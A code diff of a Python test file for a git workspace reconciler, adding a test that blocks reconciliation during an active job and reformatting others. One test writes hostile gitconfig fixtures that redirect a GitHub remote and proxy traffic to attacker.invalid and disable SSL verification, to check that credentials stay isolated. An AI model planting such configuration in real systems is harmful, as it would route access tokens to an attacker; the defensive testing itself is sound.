@@ -8,7 +8,11 @@ from pydantic import SecretStr
 
 from senpai_agent.git_workflow import git_process_env
 from senpai_agent.mailbox import ControllerEvent
-from senpai_agent.workspace import StudentWorkspaceReconciler, WorkspaceDivergence
+from senpai_agent.workspace import (
+    StudentWorkspaceReconciler,
+    WorkspaceDivergence,
+    WorkspaceJobRunning,
+)
 
 
 def git(*arguments: str, cwd: Path | None = None) -> str:
@@ -73,12 +77,26 @@ def test_reconciliation_preserves_unpushed_commits_and_dirty_files(
     local_head = git("rev-parse", "HEAD", cwd=workspace)
     (workspace / "notes.txt").write_text("dirty but recoverable\n")
 
-    StudentWorkspaceReconciler(workspace)(
-        (assignment_event(assigned_head, base_sha),)
-    )
+    StudentWorkspaceReconciler(workspace)((assignment_event(assigned_head, base_sha),))
 
     assert git("rev-parse", "HEAD", cwd=workspace) == local_head
     assert (workspace / "notes.txt").read_text() == "dirty but recoverable\n"
+
+
+def test_reconciliation_does_not_touch_checkout_while_mutable_job_is_active(
+    tmp_path: Path,
+):
+    _remote, _seed, workspace, base_sha, assigned_head = assigned_workspace(tmp_path)
+    original_head = git("rev-parse", "HEAD", cwd=workspace)
+    reconciler = StudentWorkspaceReconciler(
+        workspace,
+        active_mutable_job_ids=lambda: ("job-17",),
+    )
+
+    with pytest.raises(WorkspaceJobRunning, match="job-17"):
+        reconciler((assignment_event(assigned_head, base_sha),))
+
+    assert git("rev-parse", "HEAD", cwd=workspace) == original_head
 
 
 def test_reconciliation_rejects_a_remote_head_newer_than_the_assignment(
@@ -175,20 +193,24 @@ def test_reconciliation_hydrates_exact_controller_owned_head_and_base_refs(
 ):
     _remote, _seed, workspace, base_sha, assigned_head = assigned_workspace(tmp_path)
 
-    StudentWorkspaceReconciler(workspace)(
-        (assignment_event(assigned_head, base_sha),)
-    )
+    StudentWorkspaceReconciler(workspace)((assignment_event(assigned_head, base_sha),))
 
-    assert git(
-        "rev-parse",
-        "refs/senpai/assignment/head",
-        cwd=workspace,
-    ) == assigned_head
-    assert git(
-        "rev-parse",
-        "refs/senpai/assignment/base",
-        cwd=workspace,
-    ) == base_sha
+    assert (
+        git(
+            "rev-parse",
+            "refs/senpai/assignment/head",
+            cwd=workspace,
+        )
+        == assigned_head
+    )
+    assert (
+        git(
+            "rev-parse",
+            "refs/senpai/assignment/base",
+            cwd=workspace,
+        )
+        == base_sha
+    )
 
 
 def test_reconciliation_rejects_an_unavailable_exact_base_without_mutation(
@@ -279,14 +301,12 @@ def test_reconciliation_isolates_typed_auth_from_hostile_git_configuration(
     )
     global_config = tmp_path / "hostile-global.gitconfig"
     global_config.write_text(
-        "[url \"https://attacker.invalid/global.git\"]\n"
+        '[url "https://attacker.invalid/global.git"]\n'
         "\tinsteadOf = https://github.com/acme/widgets.git\n"
         "[http]\n\tsslVerify = false\n"
     )
     system_config = tmp_path / "hostile-system.gitconfig"
-    system_config.write_text(
-        "[http]\n\tproxy = http://attacker.invalid:8080\n"
-    )
+    system_config.write_text("[http]\n\tproxy = http://attacker.invalid:8080\n")
     github_remote = "https://github.com/acme/widgets.git"
 
     def guarded_run(command, **kwargs):
@@ -313,19 +333,12 @@ def test_reconciliation_isolates_typed_auth_from_hostile_git_configuration(
             assert configuration["http.sslVerify"] == "true"
             assert configuration["http.https://github.com/.sslVerify"] == "true"
             assert configuration["http.followRedirects"] == "false"
-            assert (
-                configuration["http.https://github.com/.followRedirects"]
-                == "false"
-            )
+            assert configuration["http.https://github.com/.followRedirects"] == "false"
             assert configuration["http.extraHeader"] == ""
             encoded = configuration[
                 "http.https://github.com/.extraHeader"
-            ].removeprefix(
-                "Authorization: Basic "
-            )
-            assert base64.b64decode(encoded).decode() == (
-                "x-access-token:typed-token"
-            )
+            ].removeprefix("Authorization: Basic ")
+            assert base64.b64decode(encoded).decode() == ("x-access-token:typed-token")
             command = [*command]
             command[command.index(github_remote)] = str(remote)
             replacement_environment = git_process_env(None)
